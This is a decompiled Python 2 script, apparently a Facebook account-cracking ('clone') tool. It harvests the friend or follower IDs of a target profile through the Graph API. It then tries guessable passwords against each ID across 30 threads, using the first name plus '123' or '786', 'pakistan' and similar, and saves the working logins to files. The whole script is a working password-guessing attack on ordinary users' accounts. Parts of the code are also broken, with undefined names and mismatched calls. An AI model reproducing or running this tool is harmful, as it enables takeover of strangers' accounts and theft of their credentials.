# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Mar 20 2021, 14:58:25) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: dg
try:
    import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass, mechanize, requests
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
    from mechanize import Browser
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')
    os.system('python2 Khan.py')

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exit():
    print '[!] Exit'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def Sarfraz(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


logo="""

/ ___|  __ _ _ __ / _|_ __ __ _ ____
\__ \/ _` | '__| |_| '__/ _` |_  /
  ___) | (_| | |  |  _| | | (_| |/ /
 |____/ \_,_|_|  |_| |_|  \_,_/___|
 
"""

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r[\xe2\x9c\x94] Logging In ' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
id = []

def tlogin():
    os.system('clear')
    print banner
    username = raw_input('[\xf0\x9f\x94\x90] \x1b[1;94mTOOL USERNAME: ')
    if username == 'Sarfraz':
        os.system('clear')
        print banner
        print '[\xe2\x9c\x93]  \x1b[1;91mTOOL USERNAME: ' + username + ' (correct)'
    else:
        print '[!] Invalid Username.'
        time.sleep(1)
        tlogin()
    passw = raw_input('[\xf0\x9f\x94\x90]  \x1b[1;94mTOOL PASSWORD: ')
    if passw == 'Shar':
        os.system('clear')
        print banner
        print '[\xe2\x9c\x93]  \x1b[1;91mTOOL USERNAME: ' + username + ' (correct)'
        print '[\xe2\x9c\x93]  \x1b[1;91mTOOL PASSWORD: ' + passw + '  (correct)'
        time.sleep(2)
    else:
        print '[!] Invalid Password.'
        time.sleep(1)
        tlogin()
    try:
        toket = open('login.txt', 'r')
        os.system('python2 .Khan2.py')
    except (KeyError, IOError):
        methodlogin()
    else:
        print '[!] Invalid Password'
        time.sleep(1)
        tlogin()


def methodlogin():
    os.system('clear')
    print banner
    print '[1] \x1b[1;93m Login With ID/Password.'
    print '[2]  \x1b[1;93mLogin Using Token.( No Identity Problem )'
    print '[3]  \x1b[1;93mExit.'
    print '      '
    hos = raw_input('\n \x1b[1;92mChoose Option >>  ')
    if hos == '':
        print '[!]  Wrong Input'
        exit()
    elif hos == '1':
        login()
    elif hos == '2':
        os.system('clear')
        print banner
        hosp = raw_input('[\xf0\x9f\x94\x91]  \x1b[1;91mGive Token : ')
        tik()
        hopa = open('login.txt', 'w')
        hopa.write(hosp)
        hopa.close()
        print '\n[\xe2\x9c\x93]  \x1b[1;91mLogged In Successfully.'
        time.sleep(1)
        os.system('xdg-open https://www.facebook.com/sarfaraz.shar.1')
        os.system('python2 .Khan2.py')
    elif hos == '0':
        exit()
    else:
        print '[!] \x1b[1;91mWrong Input'
        exit()


def login():
    os.system('clear')
    try:
        tb = open('login.txt', 'r')
        os.system('python2 .Khan2.py')
    except (KeyError, IOError):
        os.system('clear')
        print banner
        hamza('[\xf0\x9f\x94\x90] \x1b[1;96mLogin Your Facebook Account')
        hamza('[\xf0\x9f\x94\x90] \x1b[1;96mDonot Use Your Personal Account')
        hamza('[\xf0\x9f\x94\x90] \x1b[1;96mUse a New Facebook Account To Login')
        print '-------------------------------------'
        iid = raw_input('[+] Number/Email: ')
        id = iid.replace(' ', '')
        pwd = raw_input('[+] Password : ')
        tik()
        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + id + '&locale=en_US&password=' + pwd + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
        z = json.load(data)
        if 'access_token' in z:
            st = open('login.txt', 'w')
            st.write(z['access_token'])
            st.close()
            print '\n[\xe2\x9c\x93] \x1b[1;91mLogged In Successfully.'
            time.sleep(1)
            os.system('xdg-open https://www.facebook.com/sarfaraz.shar.1')
            os.system('clear')
            os.system('python2 .Khan2.py')
        elif 'www.facebook.com' in z['error_msg']:
            print '[!] \x1b[1;91mUser Must Verify Account Before Login.'
            time.sleep(3)
            login()
        else:
            print '[!]\x1b[1;91mNumber/User Id/ Password Is Wrong !'
            time.sleep(1)
            login()

def b_menu():
    global token
    os.system("clear")
    logo()
    try:
        token = open(".fb_token.txt","r").read()
    except (KeyError , IOError):
        login
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token)
        q = json.loads(r.text)
        nm = q["name"]
        nmf = nm.rsplit(" ")[0]
        ok = nmf
    except (KeyError , IOError):
        print("\t    "+c+"ID has checkpoint"+c2)
        os.system("rm -rf .fb_token.txt")
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        logo()
        os.system('echo -e " \t    \033[1;31mTurn on mobile data OR wifi \033[0;97m "| lolcat')
        time.sleep(1)
        raw_input(" Press enter to try again \033[0;97m")
        b_menu()
    os.system("clear")
    logo()
    print("\t  "+c+"User ID"+ok+c2)
    os.system('echo -e "-----------------------------------------------"| lolcat')
    os.system('echo -e "[1]-⋄-Clone From Public ID "| lolcat')
    os.system('echo -e "[2]-⋄-Clone From Followers "| lolcat')
    os.system('echo -e "[0]-⋄-Logout "| lolcat')
    os.system('echo -e "-----------------------------------------------"| lolcat')
    b_menu_select()
def b_menu_select():
	sarfraz= raw_input("\n╰─➤ ")
	id=[]
	oks=[]
	cps=[]
	if sarfraz =="1":
		os.system("clear")
		logo
		os.system('echo -e "\t    Public ID Menu " | lolcat')
		os.system('echo -e "-----------------------------------------------"| lolcat')
		idt = raw_input(" Enter ID/Username :  ")
		os.system('echo -e "-----------------------------------------------"| lolcat')
		time.sleep(2)
		os.system("clear")
		logo
		print("")
		print("")
		print("")
		os.system('echo -e "\t    Please Wait " | lolcat')
		print("")
		print("")
		print("")
		time.sleep(5)
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system("clear")
			logo()
			os.system('echo -e "\t    Public ID Menu " | lolcat')
			os.system('echo -e "-----------------------------------------------"| lolcat')
			print(" User ID : "+q["name"])
		except (KeyError , IOError):
		    os.system('echo -e " \n\t    \033[1;31m Logged in id has been checkpoint\033[0;97m "| lolcat')
		    raw_input("\nPress enter to back ")
		    b_menu()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif sarfraz =="2":
		os.system("clear")
		logo()
		os.system('echo -e "\t    Followers ID Menu " | lolcat')
		os.system('echo -e "-----------------------------------------------"| lolcat')
		idt = raw_input(" Enter ID/Username : ")
		time.sleep(2)
		os.system("clear")
		logo()
		print("")
		print("")
		print("")
		os.system('echo -e "\t    Please Wait " | lolcat')
		print("")
		print("")
		print("")
		time.sleep(5)
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			os.system("clear")
			logo()
			os.system('echo -e "\t    Followers ID Menu" | lolcat')
			print(" User ID : "+q["name"])
			os.system('echo -e "-----------------------------------------------"| lolcat')
		except (KeyError , IOError):
		    os.system('echo -e " \t    \033[1;31m Logged in id has been checkpoint\033[0;97m"| lolcat')
		    raw_input("\nPress enter to back ")
		    b_menu()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
			
	print(" Total IDs   : "+str(len(id)))
	time.sleep(2)
	os.system("clear")
	logo
	os.system('echo -e "Please wait clone account will be appear here "| lolcat')
	os.system('echo -e "Dev by : Sarfraz Baloch "| lolcat')
	os.system('echo -e "-----------------------------------------------"| lolcat')
	
	
	def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
		    pass1=name+"123"
		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		    d=json.loads(q)
		    if 'www.facebook.com' in d['error_msg']:
		        print("\x1b[1;97m[\x1b[1;93mSS-Check-Point\x1b[1;97m]\x1b[1;93m "+uid+"\x1b[1;97m | \x1b[1;93m"+pass1+"\x1b[1;97m | \x1b[1;93m"+name)
		        cp=open("SScp.txt","a")
		        cp.write(uid+" | "+pass1+"\n")
		        cp.close()
		        cps.append(uid)
		    else:
		    	if "access_token" in d:
		            print("\t\x1b[1;92m[SS-Successfull] "+uid+" | "+pass1+" | "+name)
		            ok=open("SSok.txt","a")
		            ok.write(uid+" | "+pass1+"\n")
		            ok.close()
		            oks.append(uid)
		        else:
		            pass2=name+"1234"
		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		            d=json.loads(q)
		            if 'www.facebook.com' in d['error_msg']:
		                print("\x1b[1;97m[\x1b[1;93mSS-Check-Point\x1b[1;97m]\x1b[1;93m "+uid+"\x1b[1;97m | \x1b[1;93m"+pass2+"\x1b[1;97m | \x1b[1;93m"+name)
		                cp=open("SS.cp.txt","a")
		                cp.write(uid+" | "+pass2+"\n")
		                cp.close()
		                cps.append(uid)
		            else:
		                if 'access_token' in d:
		                    print("\t\x1b[1;92m[SS-Successfull] "+uid+" | "+pass2+" | "+name)
		                    ok=open("SSok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                else:
		                    pass3=name+"12345"
		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                    d=json.loads(q)
		                    if 'www.facebook.com' in d['error_msg']:
		                        print("\x1b[1;97m[\x1b[1;93mSS-Check-Point\x1b[1;97m]\x1b[1;93m "+uid+"\x1b[1;97m | \x1b[1;93m"+pass3+"\x1b[1;97m | \x1b[1;93m"+name)
		                        cp=open("SScp.txt","a")
		                        cp.write(uid+" | "+pass3+"\n")
		                        cp.close()
		                        cps.append(uid)
		                    else:
		                        if 'access_token' in d:
		                            print("\t\x1b[1;92m[SS-Successfull] "+uid+" | "+pass3+" | "+name)
		                            ok=open("SSok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                        else:
		                            pass4=name+"786"
		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                            d=json.loads(q)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print("\x1b[1;97m[\x1b[1;93mSS-Check-Point\x1b[1;97m]\x1b[1;93m "+uid+"\x1b[1;97m | \x1b[1;93m"+pass4+"\x1b[1;97m | \x1b[1;93m"+name)
		                                cp=open("SScp.txt","a")
		                                cp.write(uid+" | "+pass4+"\n")
		                                cp.close()
		                                cps.append(uid)
		                            else:
		                                if 'access_token' in d:
		                                    print("\t\x1b[1;92m[SS-Successfull] "+uid+" | "+pass4+" | "+name)
		                                    ok=open("SSok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                else:
		                                    pass5="786786"
		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                    d=json.loads(q)
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        print("\x1b[1;97m[\x1b[1;93mSS-Check-Point\x1b[1;97m]\x1b[1;93m "+uid+"\x1b[1;97m | \x1b[1;93m"+pass5+"\x1b[1;97m | \x1b[1;93m"+name)
		                                        cp=open("SScp.txt","a")
		                                        cp.write(uid+" | "+pass5+"\n")
		                                        cp.close()
		                                        cps.append(uid)
		                                    else:
		                                        if 'access_token' in d:
		                                            print("\t\x1b[1;92m[SS-Successfull] "+uid+" | "+pass5+" | "+name)
		                                            ok=open("SSok.txt","a")
		                                            ok.write(uid+" | "+pass5+"\n")
		                                            ok.close()
		                                            oks.append(uid)
		                                        else:
		                                            pass6="786000"
		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                            d=json.loads(q)
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                print("\x1b[1;97m[\x1b[1;93mSS-Check-Point\x1b[1;97m]\x1b[1;93m "+uid+"\x1b[1;97m | \x1b[1;93m"+pass6+"\x1b[1;97m | \x1b[1;93m"+name)
		                                                cp=open("SScp.txt","a")
		                                                cp.write(uid+" | "+pass6+"\n")
		                                                cp.close()
		                                                cps.append(uid)
		                                            else:
		                                                if 'access_token' in d:
		                                                    print("\t\x1b[1;92m[SS-Successfull] "+uid+" | "+pass6+" | "+name)
		                                                    ok=open("SSok.txt","a")
		                                                    ok.write(uid+" | "+pass6+"\n")
		                                                    ok.close()
		                                                    oks.append(uid)
		                                                else:
		                                                    pass7="pakistan"
		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                                    d=json.loads(q)
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        print("\x1b[1;97m[\x1b[1;93mSS-Check-Point\x1b[1;97m]\x1b[1;93m "+uid+"\x1b[1;97m | \x1b[1;93m"+pass7+"\x1b[1;97m | \x1b[1;93m"+name)
		                                                        cp=open("SScp.txt","a")
		                                                        cp.write(uid+" | "+pass7+"\n")
		                                                        cp.close()
		                                                        cps.append(uid)
		                                                    else:
		                                                        if 'access_token' in d:
		                                                            print("\t\x1b[1;92m[SS-Successfull] "+uid+" | "+pass7+" | "+name)
		                                                            ok=open("SS-ok.txt","a")
		                                                            ok.write(uid+" | "+pass7+"\n")
		                                                            ok.close()
		                                                            oks.append(uid)
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	os.system('echo -e "-----------------------------------------------"| lolcat')
	os.system('echo -e "The Process has been completed "| lolcat')
	print (" Total CP/OK : "+str(len(cps)) + "/"+str(len(oks)))
        os.system('echo -e "-----------------------------------------------"| lolcat')
	raw_input(" Press enter to main menu back ")
	b_menu()
	
if __name__ == '__main__':
    sarfraz()

